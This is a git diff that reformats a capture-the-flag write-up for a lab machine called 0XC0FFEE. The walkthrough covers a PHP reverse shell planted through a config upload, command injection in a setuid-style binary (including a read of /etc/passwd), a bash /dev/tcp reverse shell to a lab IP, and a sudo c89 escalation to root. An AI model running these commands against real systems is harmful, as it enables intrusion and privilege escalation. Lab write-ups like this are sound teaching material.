@@ -2,12 +2,14 @@
 sticker: emoji//2615
 ---
 
-# PORT SCAN
----
+# 0XC0FFEE
 
+## PORT SCAN
+
+***
 
 | PORT | SERVICE |
-| :--- | :------ |
+| ---- | ------- |
 | 80   | HTTP    |
 | 7777 | HTTP    |
 
@@ -25,28 +27,23 @@ PORT     STATE SERVICE REASON  VERSION
 |_  Supported Methods: GET HEAD
 ```
 
+## RECONNAISSANCE
 
-
-
-# RECONNAISSANCE
----
+***
 
 We got two web applications, let's check them up:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604161212.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604161212.png)
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604161237.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604161237.png)
 
 As seen, on port `7777` we got some important stuff, for example, on here, we got `id_rsa` inside of `.ssh` but the file is empty, we can also find this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604162256.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604162256.png)
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604162307.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604162307.png)
 
 If we analyze the `history.txt` file, we can find this section:
-
 
 ```
 una pequeÃ±a pero crÃ­tica vulnerabilidad en el protocolo de encriptaciÃ³n utilizado. Con una mezcla de astucia y tÃ©cnica avanzada, pudo realizar un ataque sofisticado que permitiÃ³ descifrar el contenido protegido bajo el "super_secure_password".
@@ -60,42 +57,35 @@ super_secure_password
 
 Let's check:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604162541.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604162541.png)
 
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604162547.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604162547.png)
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604162554.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604162554.png)
 
 There we go, we were able to get into the panel, let's proceed with exploitation.
 
+## EXPLOITATION
 
-
-# EXPLOITATION
----
+***
 
 We are dealing with a site in which we can create configuration files and save them, then we can execute remote configuration files, the issue on this site is that we can use `.php` files as configuration files too, meaning, we can inject a reverse shell on here, let's do it:
 
-
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604163713.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604163713.png)
 
 Now, we need to fetch the configuration and have our listener ready:
 
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604163800.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604163800.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604163804.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604163804.png)
-
-There we go, as seen, without proper sanitization and control over the files, we can get ourselves a reverse shell. 
+There we go, as seen, without proper sanitization and control over the files, we can get ourselves a reverse shell.
 
 Let's proceed with PRIVESC.
 
+## PRIVILEGE ESCALATION
 
-# PRIVILEGE ESCALATION
----
-
+***
 
 Since we already got a shell, first step is to stabilize it:
 
@@ -109,13 +99,13 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604163927.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604163927.png)
 
 Ok, let's look around, we can use linpeas:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604164147.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604164147.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604164240.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604164240.png)
 
 Let's check the `codebad` user's home:
 
@@ -152,14 +142,13 @@ toma su nombre de algo que no es nada normal.
 
 The answer for this would be `troyano` or `trojan` in english, we also got a binary named `code` on here, a good approach would be analyzing it with `ghidra`:
 
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604165318.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604165318.png)
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604165325.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604165325.png)
 
 We got a nice approach on how to get root access, the binary basically expects exactly one argument (besides the binary name). If you pass one argument, it calls `execute_command(arg)`. Otherwise, it just prints a usage message and exits.
 
-This matters because this binary is vulnerable to `command injection`, 
+This matters because this binary is vulnerable to `command injection`,
 
 ```
 snprintf(buf, 0x100, "%s %s", "/bin/ls", param_1)
@@ -169,7 +158,7 @@ Simply concatenates `"/bin/ls"` and `param_1` (without any sanitization), we can
 
 First of all, we can migrate from `www-data` to `codebase` using the password `malware`, this seem to be the right answer from the riddle, which is weird because it should be trojan but since trojan is a type of malware, it makes sense.
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604165614.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604165614.png)
 
 Now, let's go to testing the command injection, we already know how it works, so, we can simply try this:
 
@@ -177,10 +166,9 @@ Now, let's go to testing the command injection, we already know how it works, so
 ./code ";cat /etc/passwd"
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604165646.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604165646.png)
 
 As seen, it works, let's start a listener and send ourselves a reverse shell, if we check our sudo -l permissions, we can check this:
-
 
 ```
 codebad@ac11496ac62b:~$ sudo -l
@@ -199,7 +187,7 @@ Knowing this, we can receive a shell as metadata with:
 sudo -u metadata /home/codebad/code "; /bin/bash -c 'bash -i >& /dev/tcp/192.168.200.136/9001 0>&1'"
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604170308.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604170308.png)
 
 Nice, we got a shell as this user, let's stabilize it first:
 
@@ -213,7 +201,7 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604170531.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604170531.png)
 
 Got our first flag:
 
@@ -239,7 +227,7 @@ drwxr-xr-x 1 root     root       14 Aug 29  2024 ..
 
 We cannot read this file, let's use linpeas again then:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604171039.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604171039.png)
 
 Inside of `/usr/local/bin`, we can find:
 
@@ -266,22 +254,21 @@ whoami | grep 'pass.txt'
 
 Weird, maybe `metadatosmalos` is the password for the metadata user, let's use sudo to check:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604171223.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604171223.png)
 
 Yes, it worked, as seen we can run sudo with `/usr/bin/c89`, let's check this out on GTFOBINS:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604171418.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604171418.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604171501.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604171501.png)
 
 So, we can do:
-
 
 ```
 sudo /usr/bin/c89 -wrapper /bin/sh,-s .
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250604171534.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250604171534.png)
 
 There we go, we got root access:
 
@@ -289,4 +276,3 @@ There we go, we got root access:
 # cat /root/root.txt
 d6c4a33bec66ea2948f09a0db32335de
 ```
-
